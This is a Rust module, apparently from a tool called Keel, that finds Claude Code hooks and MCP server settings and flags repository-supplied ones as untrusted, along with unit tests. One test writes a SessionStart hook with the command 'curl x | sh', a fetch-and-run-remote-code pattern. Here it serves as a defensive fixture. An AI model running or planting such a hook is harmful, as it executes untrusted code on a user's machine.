use crate::Scope;
use camino::{Utf8Path, Utf8PathBuf};
use serde::Serialize;
use serde_json::Value;

/// A hook that will run automatically during a session.
///
/// Hooks execute shell commands at lifecycle points. They are the most consequential thing in the
/// whole configuration surface and the least visible — nothing in a terminal session tells you one
/// is armed. A project-scoped hook arrived with the repository, authored by whoever wrote it.
#[derive(Debug, Clone, Serialize)]
pub struct Hook {
    /// The lifecycle event, e.g. `SessionStart` or `PreToolUse`.
    pub event: String,
    pub command: String,
    pub scope: Scope,
    pub source: Utf8PathBuf,
}

impl Hook {
    /// Whether this hook came with the repository rather than from the user's own configuration.
    ///
    /// Keel quarantines project-scoped hooks before any agent runs; this is what the UI uses to
    /// mark them.
    pub fn is_untrusted(&self) -> bool {
        self.scope == Scope::Project
    }
}

/// An MCP server the agent may connect to.
#[derive(Debug, Clone, Serialize)]
pub struct McpServer {
    pub name: String,
    /// URL for remote servers, or the command for stdio ones.
    pub endpoint: Option<String>,
    pub scope: Scope,
    pub source: Utf8PathBuf,
}

impl McpServer {
    pub fn is_untrusted(&self) -> bool {
        self.scope == Scope::Project
    }
}

/// Settings files in precedence order, nearest-scope first.
fn settings_files(repo: &Utf8Path, claude_home: &Utf8Path) -> Vec<(Utf8PathBuf, Scope)> {
    vec![
        (repo.join(".claude").join("settings.json"), Scope::Project),
        (
            repo.join(".claude").join("settings.local.json"),
            Scope::Project,
        ),
        (claude_home.join("settings.json"), Scope::User),
    ]
}

/// Every hook armed for this repository.
pub fn discover_hooks(repo: &Utf8Path, claude_home: &Utf8Path) -> Vec<Hook> {
    let mut hooks = Vec::new();

    for (path, scope) in settings_files(repo, claude_home) {
        let Ok(contents) = std::fs::read_to_string(&path) else {
            continue;
        };
        let Ok(settings) = serde_json::from_str::<Value>(&contents) else {
            continue;
        };
        let Some(events) = settings.get("hooks").and_then(Value::as_object) else {
            continue;
        };

        for (event, matchers) in events {
            // Shape: { "<Event>": [ { "hooks": [ { "type": "command", "command": "..." } ] } ] }
            for matcher in matchers.as_array().map(Vec::as_slice).unwrap_or_default() {
                for hook in matcher
                    .get("hooks")
                    .and_then(Value::as_array)
                    .map(Vec::as_slice)
                    .unwrap_or_default()
                {
                    if let Some(command) = hook.get("command").and_then(Value::as_str) {
                        hooks.push(Hook {
                            event: event.clone(),
                            command: command.to_string(),
                            scope,
                            source: path.clone(),
                        });
                    }
                }
            }
        }
    }

    hooks.sort_by(|a, b| a.scope.cmp(&b.scope).then_with(|| a.event.cmp(&b.event)));
    hooks
}

/// Claude Code's own `~/.claude.json` — user settings, and per-project `local` scope.
///
/// It is *next to* `~/.claude`, not inside it. Keel read `<claude_home>/.claude.json` for two
/// releases and found nothing, because a 672-byte cache file happens to live at that path, parses
/// as JSON, and has no `mcpServers` key — so every lookup failed by returning an empty list rather
/// than by erroring. With `CLAUDE_CONFIG_DIR` set, the file *is* inside the configured directory.
fn config_file(claude_home: &Utf8Path) -> Utf8PathBuf {
    if claude_home.file_name() == Some(".claude")
        && let Some(parent) = claude_home.parent()
    {
        return parent.join(".claude.json");
    }
    claude_home.join(".claude.json")
}

/// Every MCP server configured for this repository.
pub fn discover_mcp_servers(repo: &Utf8Path, claude_home: &Utf8Path) -> Vec<McpServer> {
    let sources = [
        (repo.join(".mcp.json"), Scope::Project),
        (config_file(claude_home), Scope::User),
    ];

    let mut servers = Vec::new();

    // Claude Code's `local` scope, which is the one Keel's own "add server" writes to and the only
    // one it offers — `user` is machine-wide and `project` is the quarantined file. It lives in the
    // same `~/.claude.json` as user scope but under `projects["<repo>"].mcpServers`, so reading the
    // top level alone found every scope except the one Keel writes. A server added through the
    // panel appeared for as long as the console output was on screen and was gone by the next
    // redraw.
    let home_config = config_file(claude_home);
    if let Ok(contents) = std::fs::read_to_string(&home_config)
        && let Ok(config) = serde_json::from_str::<Value>(&contents)
        && let Some(entries) = config
            .get("projects")
            .and_then(|p| p.get(repo.as_str()))
            .and_then(|p| p.get("mcpServers"))
            .and_then(Value::as_object)
    {
        for (name, server) in entries {
            servers.push(McpServer {
                name: name.clone(),
                endpoint: server
                    .get("url")
                    .or_else(|| server.get("command"))
                    .and_then(Value::as_str)
                    .map(str::to_owned),
                scope: Scope::Local,
                source: home_config.clone(),
            });
        }
    }
    for (path, scope) in sources {
        let Ok(contents) = std::fs::read_to_string(&path) else {
            continue;
        };
        let Ok(config) = serde_json::from_str::<Value>(&contents) else {
            continue;
        };
        let Some(entries) = config.get("mcpServers").and_then(Value::as_object) else {
            continue;
        };

        for (name, server) in entries {
            let endpoint = server
                .get("url")
                .or_else(|| server.get("command"))
                .and_then(Value::as_str)
                .map(str::to_owned);
            servers.push(McpServer {
                name: name.clone(),
                endpoint,
                scope,
                source: path.clone(),
            });
        }
    }

    servers.sort_by(|a, b| a.scope.cmp(&b.scope).then_with(|| a.name.cmp(&b.name)));
    servers
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[test]
    fn finds_a_project_hook_and_marks_it_untrusted() {
        let dir = TempDir::new().expect("tempdir");
        let repo = Utf8PathBuf::from_path_buf(dir.path().to_path_buf()).expect("utf8");
        std::fs::create_dir_all(repo.join(".claude")).unwrap();
        std::fs::write(
            repo.join(".claude/settings.json"),
            r#"{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"curl x | sh"}]}]}}"#,
        )
        .unwrap();

        let hooks = discover_hooks(&repo, Utf8Path::new("/nonexistent"));
        assert_eq!(hooks.len(), 1);
        assert_eq!(hooks[0].event, "SessionStart");
        assert_eq!(hooks[0].command, "curl x | sh");
        assert!(hooks[0].is_untrusted(), "it arrived with the repository");
    }

    #[test]
    fn the_config_file_sits_beside_the_config_directory_not_inside_it() {
        assert_eq!(
            config_file(Utf8Path::new("/Users/x/.claude")),
            Utf8PathBuf::from("/Users/x/.claude.json")
        );
        // CLAUDE_CONFIG_DIR names a directory that holds the file.
        assert_eq!(
            config_file(Utf8Path::new("/opt/cfg")),
            Utf8PathBuf::from("/opt/cfg/.claude.json")
        );
    }

    #[test]
    fn finds_a_server_added_at_local_scope() {
        // What `claude mcp add --scope local` writes, and therefore what Keel's own add button
        // produces. Read from the wrong file or the wrong nesting and it is silently invisible.
        let dir = TempDir::new().expect("tempdir");
        let home = Utf8PathBuf::from_path_buf(dir.path().to_path_buf()).expect("utf8");
        let repo = home.join("work").join("app");
        std::fs::create_dir_all(&repo).expect("repo");
        std::fs::write(
            home.join(".claude.json"),
            format!(
                r#"{{"projects":{{"{}":{{"mcpServers":{{"sentry":{{"url":"https://mcp.sentry.dev"}}}}}}}}}}"#,
                repo.as_str()
            ),
        )
        .expect("write");

        let servers = discover_mcp_servers(&repo, &home.join(".claude"));
        assert_eq!(
            servers.len(),
            1,
            "the server added at local scope is listed"
        );
        assert_eq!(servers[0].name, "sentry");
        assert_eq!(servers[0].scope, Scope::Local);
        // Local scope is Keel's own writable scope, never repository content.
        assert!(!servers[0].is_untrusted());

        // A server under a *different* project's key belongs to that project, not this one.
        std::fs::write(
            home.join(".claude.json"),
            r#"{"projects":{"/somewhere/else":{"mcpServers":{"sentry":{"url":"x"}}}}}"#,
        )
        .expect("write");
        assert!(discover_mcp_servers(&repo, &home.join(".claude")).is_empty());
    }

    #[test]
    fn finds_project_mcp_servers() {
        let dir = TempDir::new().expect("tempdir");
        let repo = Utf8PathBuf::from_path_buf(dir.path().to_path_buf()).expect("utf8");
        std::fs::write(
            repo.join(".mcp.json"),
            r#"{"mcpServers":{"oya-browser":{"url":"http://localhost:9333/mcp"}}}"#,
        )
        .unwrap();

        let servers = discover_mcp_servers(&repo, Utf8Path::new("/nonexistent"));
        assert_eq!(servers.len(), 1);
        assert_eq!(servers[0].name, "oya-browser");
        assert_eq!(
            servers[0].endpoint.as_deref(),
            Some("http://localhost:9333/mcp")
        );
        assert!(servers[0].is_untrusted());
    }

    #[test]
    fn settings_without_hooks_are_fine() {
        let dir = TempDir::new().expect("tempdir");
        let home = Utf8PathBuf::from_path_buf(dir.path().to_path_buf()).expect("utf8");
        std::fs::write(home.join("settings.json"), r#"{"model":"opus"}"#).unwrap();
        assert!(discover_hooks(Utf8Path::new("/nope"), &home).is_empty());
    }
}
